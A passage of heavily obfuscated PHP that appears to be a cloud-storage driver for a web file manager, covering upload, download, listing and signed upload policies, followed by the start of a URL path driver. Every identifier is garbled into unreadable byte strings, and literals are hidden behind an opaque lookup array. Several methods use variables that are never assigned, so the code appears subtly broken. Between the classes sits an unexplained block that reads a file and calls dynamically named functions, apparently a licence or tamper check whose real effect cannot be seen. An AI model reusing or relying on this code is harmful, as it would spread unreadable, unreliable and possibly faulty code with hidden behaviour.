$áİ¹ë„ƒ[$€ö©‘õ£[1206]]; } else { if (!$áİ¹ë„ƒ[$€ö©‘õ£[756]] && isset($Úãó£æÜ[$€ö©‘õ£[1470]])) { $Úãó£æÜ = $Úãó£æÜ[$€ö©‘õ£[1470]]; } } } return array($€ö©‘õ£[1216] => $áİ¹ë„ƒ[$€ö©‘õ£[756]], $€ö©‘õ£[1206] => $Úãó£æÜ); } public function mkfile($±‡ÆÄÒê, $¸Íè­Å• = '', $ÉÓ°®¢ = REPEAT_RENAME) { if ($this->setContent($±‡ÆÄÒê, $¸Íè­Å•)) { return $this->getPathOuter($±‡ÆÄÒê); } return !1; } public function mkdir($‹Â†ê‚µ, $Û³É÷î€ = REPEAT_SKIP) { $ÎÃÉûƒí =& $_SERVER[Ü©»’·]; $ òç‰ñ = trim($‹Â†ê‚µ, $ÎÃÉûƒí[8]); if ($this->_isFolder($ òç‰ñ)) { return $this->getPathOuter($ òç‰ñ); } $Û–Óæ¿¬ = array($ÎÃÉûƒí[1471]); $ô¶àá¥‹ = $this->ussRequest($ òç‰ñ, $ÎÃÉûƒí[226], !1, $Û–Óæ¿¬); return $ô¶àá¥‹[$ÎÃÉûƒí[1216]] ? $this->getPathOuter($ òç‰ñ) : !1; } public function copyFile($æÛãªØ, $ÃİÛã¥¢) { $¡ŞÅ‹ª¢ =& $_SERVER[Ü©»’·]; $‹ıÏèæº = array($¡ŞÅ‹ª¢[1472] . "\x2f{$this->bucket}\x2f{$æÛãªØ}", $¡ŞÅ‹ª¢[1473]); $µ“¾ğÛó = $this->ussRequest($ÃİÛã¥¢, $¡ŞÅ‹ª¢[228], !1, $‹ıÏèæº); return $µ“¾ğÛó[$¡ŞÅ‹ª¢[1216]] ? !0 : $this->getPathOuter($ÃİÛã¥¢); } public function moveFile($Àá‰¬®Ê, $ÛÄÑ¥±‰) { $ôˆ³ƒàÈ =& $_SERVER[Ü©»’·]; $”´¿ÑËÖ = array($ôˆ³ƒàÈ[1474] . "\57{$this->bucket}\x2f{$Àá‰¬®Ê}", $ôˆ³ƒàÈ[1473]); $ú·¨ğĞå = $this->ussRequest($ÛÄÑ¥±‰, $ôˆ³ƒàÈ[228], !1, $”´¿ÑËÖ); return $ú·¨ğĞå[$ôˆ³ƒàÈ[1216]] ? !0 : $this->getPathOuter($ÛÄÑ¥±‰); } public function delFile($ÎÏØŠÎœ) { $Îõ¡¬¡’ =& $_SERVER[Ü©»’·]; $ë²ºÛĞ  = $this->ussRequest($ÎÏØŠÎœ, $Îõ¡¬¡’[1475]); return $ë²ºÛĞ [$Îõ¡¬¡’[1216]] ? !0 : !1; } public function delFolder($ÛÎÅƒ¼é) { $á–†™õ =& $_SERVER[Ü©»’·]; if (!$this->exist($ÛÎÅƒ¼é)) { return !0; } $this->listItemCache = !1; $ŠŞĞï· = $²åŞÇõş = array(); $this->fileList($ÛÎÅƒ¼é, $ŠŞĞï·, $²åŞÇõş, !0); $this->listItemCache = !0; foreach ($²åŞÇõş as $Ø³‡ğŞÌ) { $‰¼û×ôÊ = $this->ussRequest($Ø³‡ğŞÌ[$á–†™õ[32]], $á–†™õ[1475]); if (!$‰¼û×ôÊ[$á–†™õ[1216]]) { return !1; } } foreach ($ŠŞĞï· as $Ÿ½Õ¶ôŠ) { $‰¼û×ôÊ = $this->ussRequest($Ÿ½Õ¶ôŠ, $á–†™õ[1475]); if (!$‰¼û×ôÊ[$á–†™õ[1216]]) { return !1; } } $‰¼û×ôÊ = $this->ussRequest($ÛÎÅƒ¼é, $á–†™õ[1475]); return $‰¼û×ôÊ[$á–†™õ[1216]]; } public function rename($šÀö­¥Â, $³¶ÏŠÅÌ) { if ($this->isFile($šÀö­¥Â)) { $³¶ÏŠÅÌ = get_path_father($šÀö­¥Â) . $³¶ÏŠÅÌ; return $this->moveFile($šÀö­¥Â, $³¶ÏŠÅÌ); } return $this->renameObject($šÀö­¥Â, $³¶ÏŠÅÌ); } public function fileInfo($¥€³Æü, $Õäà€”÷ = false, $é÷àŠ‘Ë = array()) { $ËíÀôÓ† =& $_SERVER[Ü©»’·]; $¶‘ÊÀ×ß = array($ËíÀôÓ†[32] => $this->pathThis($¥€³Æü), $ËíÀôÓ†[84] => $this->getPathOuter($ËíÀôÓ†[8] . $¥€³Æü), $ËíÀôÓ†[33] => $ËíÀôÓ†[199], $ËíÀôÓ†[76] => isset($é÷àŠ‘Ë[$ËíÀôÓ†[76]]) ? $é÷àŠ‘Ë[$ËíÀôÓ†[76]] : 0, $ËíÀôÓ†[174] => $this->ext($¥€³Æü)); if ($Õäà€”÷) { return $¶‘ÊÀ×ß; } $¶‘ÊÀ×ß[$ËíÀôÓ†[200]] = $¶‘ÊÀ×ß[$ËíÀôÓ†[85]] = 0; $¶‘ÊÀ×ß[$ËíÀôÓ†[201]] = $¶‘ÊÀ×ß[$ËíÀôÓ†[202]] = !0; if (empty($é÷àŠ‘Ë)) { $é÷àŠ‘Ë = $this->objectMeta($¥€³Æü); if (!$é÷àŠ‘Ë) { return $¶‘ÊÀ×ß; } } $¶‘ÊÀ×ß[$ËíÀôÓ†[200]] = intval($é÷àŠ‘Ë[$ËíÀôÓ†[1476]]); $¶‘ÊÀ×ß[$ËíÀôÓ†[85]] = intval($é÷àŠ‘Ë[$ËíÀôÓ†[1477]]); $¶‘ÊÀ×ß[$ËíÀôÓ†[76]] = $é÷àŠ‘Ë[$ËíÀôÓ†[76]]; return $¶‘ÊÀ×ß; } public function folderInfo($£¨ó”•Á, $ÁôÈÔùì = false) { $¨æë£‹³ =& $_SERVER[Ü©»’·]; $òØÊÙ¤‘ = array($¨æë£‹³[32] => $this->pathThis($£¨ó”•Á), $¨æë£‹³[84] => $this->getPathOuter($¨æë£‹³[8] . $£¨ó”•Á), $¨æë£‹³[33] => $¨æë£‹³[75]); if ($ÁôÈÔùì) { return $òØÊÙ¤‘; } $òØÊÙ¤‘[$¨æë£‹³[200]] = $òØÊÙ¤‘[$¨æë£‹³[85]] = 0; $òØÊÙ¤‘[$¨æë£‹³[201]] = $òØÊÙ¤‘[$¨æë£‹³[202]] = !0; if (empty($»çı)) { $»çı = $this->objectMeta($£¨ó”•Á); if (!$»çı) { return $òØÊÙ¤‘; } } $òØÊÙ¤‘[$¨æë£‹³[200]] = intval($»çı[$¨æë£‹³[1476]]); $òØÊÙ¤‘[$¨æë£‹³[85]] = intval($»çı[$¨æë£‹³[1477]]); return $òØÊÙ¤‘; } private function listObjs($ò‚ØÅõ, $™ãË¥¸ = 0, $Åõßó…° = 1000) { $ô¼íØ¡Ú =& $_SERVER[Ü©»’·]; $®Ó«›È® = array($ô¼íØ¡Ú[1478], $ô¼íØ¡Ú[1479] . $Åõßó…°); if ($™ãË¥¸) { $®Ó«›È®[] = $ô¼íØ¡Ú[1480] . $™ãË¥¸; } $‰µˆ«Õ§ = $this->ussRequest($ò‚ØÅõ, $ô¼íØ¡Ú[230], !1, $®Ó«›È®); return !$‰µˆ«Õ§[$ô¼íØ¡Ú[1216]] ? !1 : $‰µˆ«Õ§[$ô¼íØ¡Ú[1206]]; } private function fileList($Ç±†¸ˆ±, &$¨Ìê—‹ã, &$ûõ“à´Ü, $òÎïƒ÷’ = false) { $ê†…‘Ö³ =& $_SERVER[Ü©»’·]; $¦å®Ñá = $ê†…‘Ö³[12]; $Ş¶ú¡ş = 1000; $¯¢ÖÄÍ™ = rtrim($Ç±†¸ˆ±, $ê†…‘Ö³[8]) . $ê†…‘Ö³[8]; while (!0) { check_abort(); $İ‹º®Ãª = $this->listObjs($Ç±†¸ˆ±, $¦å®Ñá, $Ş¶ú¡ş); if (!$İ‹º®Ãª) { return !1; } $¦å®Ñá = isset($İ‹º®Ãª[$ê†…‘Ö³[1481]]) ? $İ‹º®Ãª[$ê†…‘Ö³[1481]] : $ê†…‘Ö³[12]; $æç«€ï = isset($İ‹º®Ãª[$ê†…‘Ö³[1482]]) ? $İ‹º®Ãª[$ê†…‘Ö³[1482]] : array(); foreach ($æç«€ï as $ìÔ¹±ïã) { $††ÔÚ® = $ìÔ¹±ïã[$ê†…‘Ö³[33]] == $ê†…‘Ö³[75] ? !0 : !1; $õò¹ùâü = ltrim($¯¢ÖÄÍ™ . $ìÔ¹±ïã[$ê†…‘Ö³[32]], $ê†…‘Ö³[8]) . ($††ÔÚ® ? $ê†…‘Ö³[8] : $ê†…‘Ö³[12]); $é™Ôá¿î = array($ê†…‘Ö³[32] => $õò¹ùâü, $ê†…‘Ö³[33] => $††ÔÚ® ? $ê†…‘Ö³[75] : $ê†…‘Ö³[199], $ê†…‘Ö³[76] => $ìÔ¹±ïã[$ê†…‘Ö³[337]], $ê†…‘Ö³[1477] => $ìÔ¹±ïã[$ê†…‘Ö³[1483]]); $this->cacheMethodInfoSet($õò¹ùâü, $††ÔÚ®, $é™Ôá¿î); if ($††ÔÚ®) { $¨Ìê—‹ã[] = $õò¹ùâü; if ($òÎïƒ÷’) { $this->fileList($õò¹ùâü, $¨Ìê—‹ã, $ûõ“à´Ü, $òÎïƒ÷’); } continue; } $ûõ“à´Ü[] = $é™Ôá¿î; } if (count($æç«€ï) < $Ş¶ú¡ş) { break; } } $this->cacheMethodInfoSet($Ç±†¸ˆ±, !0); } public function listPath($öÖ‘ÒÆ€, $è­¦Éü = false) { $ıÎ±˜¹ö =& $_SERVER[Ü©»’·]; $·ÇÛê½ = $«•¿ö¾ñ = array(); $this->fileList($öÖ‘ÒÆ€, $·ÇÛê½, $«•¿ö¾ñ); foreach ($·ÇÛê½ as $¢Ï†æáİ => $çŒèúÏ„) { $·ÇÛê½[$¢Ï†æáİ] = $this->folderInfo($çŒèúÏ„, $è­¦Éü); } foreach ($«•¿ö¾ñ as $¢Ï†æáİ => $çŒèúÏ„) { $«•¿ö¾ñ[$¢Ï†æáİ] = $this->fileInfo($çŒèúÏ„[$ıÎ±˜¹ö[32]], $è­¦Éü, $çŒèúÏ„); } return array($ıÎ±˜¹ö[82] => $·ÇÛê½, $ıÎ±˜¹ö[83] => $«•¿ö¾ñ); } public function has($¡»¡º•è, $Ç…¶©¦õ = false, $éœ™×ş = true) { $×éûİğ =& $_SERVER[Ü©»’·]; $Ù³¶ÏÎ = $×éûİğ[12]; $Ÿ¢©£Ìá = 500; $„âÒ‘È = 0; $ÅûÍÕßà = 0; $áª™¾Éë = rtrim($¡»¡º•è, $×éûİğ[8]) . $×éûİğ[8]; while (!0) { check_abort(); $¨ÀË£¶ö = $this->listObjs($¡»¡º•è, $Ù³¶ÏÎ, $Ÿ¢©£Ìá); if (!$¨ÀË£¶ö) { return !1; } $Ù³¶ÏÎ = isset($¨ÀË£¶ö[$×éûİğ[1481]]) ? $¨ÀË£¶ö[$×éûİğ[1481]] : $×éûİğ[12]; $®àÑøİ¯ = isset($¨ÀË£¶ö[$×éûİğ[1482]]) ? $¨ÀË£¶ö[$×éûİğ[1482]] : array(); if (empty($®àÑøİ¯)) { break; } $‡Œ‡æ‚§ = array_filter($®àÑøİ¯, function ($íÊ±ıŸá) { $ñ¡š§Í‹ =& $_SERVER[Ü©»’·]; return $íÊ±ıŸá[$ñ¡š§Í‹[33]] == $ñ¡š§Í‹[75]; }); $ñ¬èÇ¬« = count($®àÑøİ¯); $‡Œ‡æ‚§ = count($‡Œ‡æ‚§); $Åäô¨¥ = $ñ¬èÇ¬« - $‡Œ‡æ‚§; if ($Ç…¶©¦õ) { $ÅûÍÕßà += $‡Œ‡æ‚§; $„âÒ‘È += $Åäô¨¥; if ($ñ¬èÇ¬« < $Ÿ¢©£Ìá) { break; } continue; } if ($éœ™×ş) { if ($Åäô¨¥) { return !0; } } else { if ($‡Œ‡æ‚§) { return !0; } } if ($ñ¬èÇ¬« < $Ÿ¢©£Ìá) { break; } } if ($Ç…¶©¦õ) { return array($×éûİğ[207] => $„âÒ‘È, $×éûİğ[208] => $ÅûÍÕßà); } return !1; } public function listAll($Âåóß­‰) { $­ÄâŠµÖ =& $_SERVER[Ü©»’·]; $¾ÔÖ©ñ³ = $ñÈ¼õİ– = array(); $this->fileList($Âåóß­‰, $¾ÔÖ©ñ³, $ñÈ¼õİ–, !0); $í‰üª¥¹ = array(); foreach ($ñÈ¼õİ– as $ôÖéÕï) { $í‰üª¥¹[$ôÖéÕï[$­ÄâŠµÖ[32]]] = $ôÖéÕï[$­ÄâŠµÖ[76]]; } foreach ($¾ÔÖ©ñ³ as $ôÖéÕï) { if (is_string($ôÖéÕï)) { $í‰üª¥¹[$ôÖéÕï] = 0; } } return $this->listAllFiles($Âåóß­‰, array_keys($í‰üª¥¹), $í‰üª¥¹); } public function canRead($µ…¡ƒİ‚) { return $this->exist($µ…¡ƒİ‚) ? !0 : !1; } public function canWrite($ûÏó¶ø¢) { return $this->exist($ûÏó¶ø¢) ? !0 : !1; } public function getContent($Ïşµµ‚Ö) { return $this->fileSubstr($Ïşµµ‚Ö, 0, -1); } public function setContent($û½½°«Õ, $à‹ïé¾ = '') { $ÖşßÀµä =& $_SERVER[Ü©»’·]; if (!$à‹ïé¾) { $ı”•ƒ‡ = $this->ussRequest($û½½°«Õ, $ÖşßÀµä[226]); return $ı”•ƒ‡[$ÖşßÀµä[1216]]; } $³ˆ‡ŸÏá = $this->tempFile($this->pathThis($û½½°«Õ)); file_put_contents($³ˆ‡ŸÏá, $à‹ïé¾); if ($this->upload($û½½°«Õ, $³ˆ‡ŸÏá)) { $this->tempFileRemve($³ˆ‡ŸÏá); return !0; } return !1; } public function fileSubstr($¯ìÍƒ…ç, $…¶Â¦ŒÈ, $¼Çí´æ) { $‰åÆöÖï =& $_SERVER[Ü©»’·]; if (!($ºÑ÷à÷‚ = $this->link($¯ìÍƒ…ç))) { return !1; } $ø“ìË· = !1; if ($¼Çí´æ > 0) { $ñÜ¿°­¥ = $…¶Â¦ŒÈ + $¼Çí´æ - 1; $ø“ìË· = array($‰åÆöÖï[1444] . $…¶Â¦ŒÈ . $‰åÆöÖï[395] . $ñÜ¿°­¥); } $ş¿Ï¼í„ = url_request($ºÑ÷à÷‚, $‰åÆöÖï[230], !1, $ø“ìË·); return $ş¿Ï¼í„[$‰åÆöÖï[756]] ? $ş¿Ï¼í„[$‰åÆöÖï[1206]] : !1; } public function upload($ØÄ¸¯‹”, $„ƒÑù‰¹, $¨öÜ‚Êù = false, $Áƒì°Åæ = REPEAT_REPLACE) { $ÑÚÙŸÚ¨ =& $_SERVER[Ü©»’·]; $ŸÛŒêö = IO::size($„ƒÑù‰¹); if ($ŸÛŒêö <= 1024 * 1024 * 200) { $§èøŠ•± = array($ÑÚÙŸÚ¨[1484] . $„ƒÑù‰¹); $ßíáÙçß = $this->ussRequest($ØÄ¸¯‹”, $ÑÚÙŸÚ¨[228], $§èøŠ•±); return $ßíáÙçß[$ÑÚÙŸÚ¨[1216]] ? $this->getPathOuter($ØÄ¸¯‹”) : !1; } $¥òêû§° = 1024 * 1024 * 10; $ñ¿¸¹Œâ = array($ÑÚÙŸÚ¨[1485], $ÑÚÙŸÚ¨[1486] . $ŸÛŒêö, $ÑÚÙŸÚ¨[1487], $ÑÚÙŸÚ¨[1488] . $¥òêû§°); $ßíáÙçß = $this->ussRequest($ØÄ¸¯‹”, $ÑÚÙŸÚ¨[228], !1, $ñ¿¸¹Œâ); if (!$ßíáÙçß[$ÑÚÙŸÚ¨[1216]]) { return !1; } $äö……ç = $ßíáÙçß[$ÑÚÙŸÚ¨[1206]]; $¹£òòˆ = 0; $“Çìò© = $äö……ç[$ÑÚÙŸÚ¨[1489]]; $¢ÊÉåüä = fopen($„ƒÑù‰¹, $ÑÚÙŸÚ¨[1393]); if (!$¢ÊÉåüä) { return !1; } do { $ºŠ¾ÜˆÍ = $äö……ç[$ÑÚÙŸÚ¨[1490]]; fseek_64($¢ÊÉåüä, $¹£òòˆ); $µçÛ¡ü = fread($¢ÊÉåüä, $ºŠ¾ÜˆÍ); $–×’Î˜­ = 0; do { $–×’Î˜­++; $äö……ç = $this->uploadPart($ØÄ¸¯‹”, $äö……ç, $µçÛ¡ü); } while (!$äö……ç && $–×’Î˜­ < 3); if (!$äö……ç) { return !1; } $“Çìò© = $äö……ç[$ÑÚÙŸÚ¨[1489]]; $¹£òòˆ += $ºŠ¾ÜˆÍ; } while ($“Çìò© != -1); fclose($¢ÊÉåüä); $ñ¿¸¹Œâ = array($ÑÚÙŸÚ¨[1491], $ÑÚÙŸÚ¨[1492] . $äö……ç[$ÑÚÙŸÚ¨[1493]], $ÑÚÙŸÚ¨[1487]); $ßíáÙçß = $this->ussRequest($ØÄ¸¯‹”, $ÑÚÙŸÚ¨[228], !1, $ñ¿¸¹Œâ); return $ßíáÙçß[$ÑÚÙŸÚ¨[1216]] ? $this->getPathOuter($®Ö†Ç¶İ) : !1; } private function uploadPart($·•Íã‡, $°ıÜÖ¹à, &$ƒ¸³ãÑ) { $Ø´š™Ç„ =& $_SERVER[Ü©»’·]; $ê¥áÀÚ = array($Ø´š™Ç„[1494], $Ø´š™Ç„[1492] . $°ıÜÖ¹à[$Ø´š™Ç„[1493]], $Ø´š™Ç„[1495] . $°ıÜÖ¹à[$Ø´š™Ç„[1489]], $Ø´š™Ç„[142] . $°ıÜÖ¹à[$Ø´š™Ç„[1490]]); $á‡—À = $this->ussRequest($·•Íã‡, $Ø´š™Ç„[228], $ƒ¸³ãÑ, $ê¥áÀÚ); return !$á‡—À[$Ø´š™Ç„[1216]] ? $á‡—À[$Ø´š™Ç„[1216]] : $á‡—À[$Ø´š™Ç„[1206]]; } public function uploadFormData($µ›¶ßá, $¥†Æ×¨š = 3600) { return $this->uploadPolicy($µ›¶ßá, $¥†Æ×¨š); } public function multiUploadFormData($º¿ØÏôş, $è¡„¼¿™ = 3600) { $Šåø˜ŒÎ =& $_SERVER[Ü©»’·]; $„óÓíÆ¿ = (int) $GLOBALS[$Šåø˜ŒÎ[7]][$Šåø˜ŒÎ[76]]; return $this->uploadPolicy($º¿ØÏôş, $è¡„¼¿™, $„óÓíÆ¿); } private function uploadPolicy($‘ĞÜğ…À, $ıšÍì…Œ = 3600, $¼çæä°§ = 0) { $š“Şëš“ =& $_SERVER[Ü©»’·]; $ªÏáÅå› = $š“Şëš“[8] . $this->bucket; $é—Åü» = gmdate($š“Şëš“[1429]); $¬İ€™„¹ = array($š“Şëš“[1496] => $this->bucket, $š“Şëš“[1497] => $‘ĞÜğ…À, $š“Şëš“[1498] => time() + $ıšÍì…Œ, $š“Şëš“[1499] => $é—Åü»); if ($¼çæä°§) { $¬İ€™„¹[$š“Şëš“[1409]] = $¼çæä°§; } $×ë°ˆõ = base64_encode(json_encode($¬İ€™„¹)); $²Ø¿Ò–˜ = base64_encode(hash_hmac($š“Şëš“[1466], "\x50\117\123\x54\x26{$ªÏáÅå›}\x26{$é—Åü»}\x26{$×ë°ˆõ}", md5("{$this->userpass}"), !0)); $œ»Ô„¬è = array($š“Şëš“[1334] => $×ë°ˆõ, $š“Şëš“[1500] => "\x55\x50\131\125\116\40{$this->username}\72{$²Ø¿Ò–˜}", $š“Şëš“[181] => $this->endpoint . $ªÏáÅå›); return $œ»Ô„¬è; } public function download($Øî® ’†, $ı¡€±û) { $øÅã©¯Á = IO::getPathInner(IO::mkfile($ı¡€±û)); if (!($©™ø«Ÿª = $this->link($Øî® ’†))) { return !1; } $¨“‡æ¿ê = 0; $Û•ºËç÷ = 1024 * 200; $Üğ»…ç = fopen($øÅã©¯Á, $_SERVER[Ü©»’·][1450]); while (!0) { $‰šÃ½‰µ = $this->fileSubstr($Øî® ’†, $¨“‡æ¿ê, $Û•ºËç÷); if ($‰šÃ½‰µ === !1) { return !1; } fwrite($Üğ»…ç, $‰šÃ½‰µ); $¨“‡æ¿ê += $Û•ºËç÷; if (strlen($‰šÃ½‰µ) < $Û•ºËç÷) { break; } } fclose($Üğ»…ç); return $ı¡€±û; } public function link($ü‡†ŸÅã, $¼ÂëÌ§å = array()) { $Òó¶çªø =& $_SERVER[Ü©»’·]; $ü‡†ŸÅã = trim($ü‡†ŸÅã, $Òó¶çªø[8]); if (!empty($this->token)) { $™ÃÂİ¡Ğ = strtotime(date($Òó¶çªø[1501])); $ƒë‘ü„ = substr(md5($this->token . $Òó¶çªø[284] . $™ÃÂİ¡Ğ . $Òó¶çªø[1502] . $ü‡†ŸÅã), 12, 8) . $™ÃÂİ¡Ğ; $¼ÂëÌ§å[] = $Òó¶çªø[1503] . $ƒë‘ü„; } $î†ÄÈ¡¥ = !empty($¼ÂëÌ§å) ? $Òó¶çªø[73] . implode($Òó¶çªø[284], $¼ÂëÌ§å) : $Òó¶çªø[12]; return $this->getHost() . $Òó¶çªø[8] . $ü‡†ŸÅã . $î†ÄÈ¡¥; } public function fileOut($ÇòûõùÎ, $ğ‡é = false, $›¢«ƒ€¬ = false, $ĞÉâ­³È = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÇòûõùÎ, $ğ‡é, $›¢«ƒ€¬, $ĞÉâ­³È); } if (!$›¢«ƒ€¬) { $›¢«ƒ€¬ = $this->pathThis($ÇòûõùÎ); } $ÃÅ›‚’€ = $ğ‡é ? array($_SERVER[Ü©»’·][1504] . rawurlencode($›¢«ƒ€¬)) : array(); $à’è —ı = $this->link($ÇòûõùÎ, $ÃÅ›‚’€); $this->fileOutLink($à’è —ı); } public function fileOutServer($Óİ©˜Üˆ, $ÈïÏ­§‹ = false, $ºÊÄøĞÚ = false, $é¹¾÷íì = '') { parent::fileOut($Óİ©˜Üˆ, $ÈïÏ­§‹, $ºÊÄøĞÚ, $é¹¾÷íì); } public function fileOutImage($±•æ¯òâ, $ãó–ÊéÙ = 250) { $Ê¬·ÈŒˆ = $this->link($±•æ¯òâ . $_SERVER[Ü©»’·][1505] . $ãó–ÊéÙ); $this->fileOutLink($Ê¬·ÈŒˆ); } public function fileOutImageServer($¥Õ¤›¥á, $ãŒÚµïİ = 250) { parent::fileOutImage($¥Õ¤›¥á, $ãŒÚµïİ); } public function hashMd5($†Ø’ˆƒ) { $Š€ˆ—ıÔ =& $_SERVER[Ü©»’·]; $çÈ¹ıÜŞ = $this->_objectMeta($†Ø’ˆƒ); return isset($çÈ¹ıÜŞ[$Š€ˆ—ıÔ[212]]) ? $çÈ¹ıÜŞ[$Š€ˆ—ıÔ[212]] : !1; } public function size($Å¨¹Øø¼) { $Üê¡Í— = $this->objectMeta($Å¨¹Øø¼); return $Üê¡Í— ? $Üê¡Í—[$_SERVER[Ü©»’·][76]] : 0; } public function info($ö¾…Åã) { if ($this->isFolder($ö¾…Åã)) { return $this->folderInfo($ö¾…Åã); } else { if ($this->isFile($ö¾…Åã)) { return $this->fileInfo($ö¾…Åã); } } return !1; } public function exist($±íãÈ´) { return $this->isFile($±íãÈ´) || $this->isFolder($±íãÈ´); } public function isFile($Á¸‡öÜ) { return !$this->isFolder($Á¸‡öÜ) && $this->objectMeta($Á¸‡öÜ); } public function isFolder($½ƒÍ¬³) { return $this->cacheMethod($_SERVER[Ü©»’·][165], $½ƒÍ¬³); } protected function objectMeta($Ì¬” µ½) { return $this->cacheMethod($_SERVER[Ü©»’·][167], $Ì¬” µ½); } protected function _objectMeta($ªÂ˜åÃè) { $ˆÆĞ¸àí =& $_SERVER[Ü©»’·]; if ($ªÂ˜åÃè == $ˆÆĞ¸àí[12] || $ªÂ˜åÃè == $ˆÆĞ¸àí[8]) { return array(); } $ˆ·ûÑå© = $this->ussRequest($ªÂ˜åÃè, $ˆÆĞ¸àí[1506]); if (!$ˆ·ûÑå©[$ˆÆĞ¸àí[1216]]) { return null; } $–¸¾ôŠÛ = isset($ˆ·ûÑå©[$ˆÆĞ¸àí[1206]]) ? $ˆ·ûÑå©[$ˆÆĞ¸àí[1206]] : array(); if (!isset($–¸¾ôŠÛ[$ˆÆĞ¸àí[1507]])) { return null; } $¶‚¹Š¹Á = array($ˆÆĞ¸àí[33] => isset($–¸¾ôŠÛ[$ˆÆĞ¸àí[1507]]) ? $–¸¾ôŠÛ[$ˆÆĞ¸àí[1507]] : null, $ˆÆĞ¸àí[76] => isset($–¸¾ôŠÛ[$ˆÆĞ¸àí[1508]]) ? $–¸¾ôŠÛ[$ˆÆĞ¸àí[1508]] : null, $ˆÆĞ¸àí[212] => isset($–¸¾ôŠÛ[$ˆÆĞ¸àí[1509]]) ? $–¸¾ôŠÛ[$ˆÆĞ¸àí[1509]] : null, $ˆÆĞ¸àí[1476] => isset($–¸¾ôŠÛ[$ˆÆĞ¸àí[1510]]) ? $–¸¾ôŠÛ[$ˆÆĞ¸àí[1510]] : null); $¶‚¹Š¹Á[$ˆÆĞ¸àí[1477]] = isset($–¸¾ôŠÛ[$ˆÆĞ¸àí[1511]]) ? strtotime($–¸¾ôŠÛ[$ˆÆĞ¸àí[1511]]) : $¶‚¹Š¹Á[$ˆÆĞ¸àí[1476]]; return $¶‚¹Š¹Á; } protected function _isFolder($ØÎˆÀ±) { $öñÂš»  =& $_SERVER[Ü©»’·]; if ($ØÎˆÀ± == $öñÂš» [12] || $ØÎˆÀ± == $öñÂš» [8]) { return !0; } $‹ßşâµ… = $this->_objectMeta($ØÎˆÀ±); return isset($‹ßşâµ…[$öñÂš» [33]]) && $‹ßşâµ…[$öñÂš» [33]] == $öñÂš» [75] ? !0 : !1; } } if ($_SERVER[$_SERVER[Ü©»’·][357]] != $_SERVER[$_SERVER[Ü©»’·][1512]]) { $_getc = $_SERVER[Ü©»’·][358]; $_getfile = $_SERVER[$_SERVER[Ü©»’·][359]] . $_SERVER[Ü©»’·][360]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ü©»’·][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ü©»’·][361]) { $exit = $_SERVER[Ü©»’·][362]; $exit(); } $_act = $_SERVER[Ü©»’·][363]; $_act($_SERVER[$_SERVER[Ü©»’·][355]]); } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Õ‰åÆîü = false) { } public function exist($¿´¨îÁı) { $°ò’ˆ» = $this->info($¿´¨îÁı); return $°ò’ˆ»[$_SERVER[Ü©»’·][201]]; } public function isFile($Ğ™¸¨Ùà) { $ßÑ¹êğ = $this->info($Ğ™¸¨Ùà); return $ßÑ¹êğ[$_SERVER[Ü©»’·][201]]; } public function isFolder($‹Şúö½) { return !1; } public function size($®š¹«ÓÆ) { $äÃË¶£î = $this->info($®š¹«ÓÆ); return $äÃË¶£î[$_SERVER[Ü©»’·][76]]; } public function info($å½‚¶¡Ä) { return $this->infoParse($å½‚¶¡Ä); } public function infoAuth($Ÿú×…Şò) { return $this->infoParse($Ÿú×…Şò); } public function infoWithChildren($ÎÕ¼Šéú) { return $this->infoParse($ÎÕ¼Šéú); } public function infoFull($ôÄÑÑ¡) { return $this->infoParse($ôÄÑÑ¡); } private function infoParse($äåô×¿Œ) { $‹²”’„ú =& $_SERVER[Ü©»’·]; $—ÙÕİø = $this->header($äåô×¿Œ); if (!$—ÙÕİø || !$—ÙÕİø[$‹²”’„ú[756]]) { return !1; } $‚ô÷Ã ¥ = _get($—ÙÕİø, $‹²”’„ú[337], 0); $‘˜ØÜ•Ë = array($‹²”’„ú[32] => $—ÙÕİø[$‹²”’„ú[32]], $‹²”’„ú[84] => $äåô×¿Œ, $‹²”’„ú[33] => $‹²”’„ú[199], $‹²”’„ú[76] => intval($‚ô÷Ã ¥), $‹²”’„ú[174] => get_path_ext($—ÙÕİø[$‹²”’„ú[32]]), $‹²”’„ú[1390] => $‚ô÷Ã ¥ > 0 && $—ÙÕİø[$‹²”’„ú[1513]], $‹²”’„ú[1391] => !1); return $‘˜ØÜ•Ë; } private function header($ïŸ”¼ëÀ) { $şÙüœ„ =& $_SERVER[Ü©»’·]; if (isset(self::$_cacheHeader[$ïŸ”¼ëÀ])) { return self::$_cacheHeader[$ïŸ”¼ëÀ]; } $‡ùŸÙ®É = isset($GLOBALS[$şÙüœ„[1514]]) ? $GLOBALS[$şÙüœ„[1514]] : !1; $GLOBALS[$şÙüœ„[1514]] = !0; self::$_cacheHeader[$ïŸ”¼ëÀ] = url_header($ïŸ”¼ëÀ); $GLOBALS[$şÙüœ„[1514]] = $‡ùŸÙ®É; return self::$_cacheHeader[$ïŸ”¼ëÀ]; } public function hashSimple($¯øÉ¥èÌ, $ˆÇëéÔÒ = false) { $àÄöÜ÷ =& $_SERVER[Ü©»’·]; $ªÍÖ»Û€ = $this->info($¯øÉ¥èÌ); if (!$ªÍÖ»Û€ || !$ªÍÖ»Û€[$àÄöÜ÷[201]]) { return !1; } $²Ÿ½ù•‡ = $ªÍÖ»Û€[$àÄöÜ÷[76]]; $Åöé’²á = 200; $Ü´…Úˆ’ = 50; if ($²Ÿ½ù•‡ <= $Åöé’²á * $Ü´…Úˆ’) { return md5($this->fileSubstr($¯øÉ¥èÌ, 0, $²Ÿ½ù•‡)) . $²Ÿ½ù•‡; } $Ì×õ±Î· = intval($²Ÿ½ù•‡ / $Ü´…Úˆ’); $×¬ÒØ® = $àÄöÜ÷[12]; $ŠĞïòå = timeFloat(); $ïÊÜ÷¦İ = 15; for ($¡æ«’æ = 0; $¡æ«’æ < $Ü´…Úˆ’; $¡æ«’æ++) { if (timeFloat() - $ŠĞïòå > $ïÊÜ÷¦İ) { return !1; } $ÈøÂŞ¼— = $this->fileSubstr($¯øÉ¥èÌ, $Ì×õ±Î· * $¡æ«’æ, $Åöé’²á); if (!$ÈøÂŞ¼—) { return !1; } $×¬ÒØ® .= $ÈøÂŞ¼—; } $×¬ÒØ® .= $this->fileSubstr($¯øÉ¥èÌ, $²Ÿ½ù•‡ - $Åöé’²á, $Åöé’²á); return md5($×¬ÒØ®) . $²Ÿ½ù•‡; } public function getContent($ùÉÎ×îÖ) { return $this->fileSubstr($ùÉÎ×îÖ); } public function 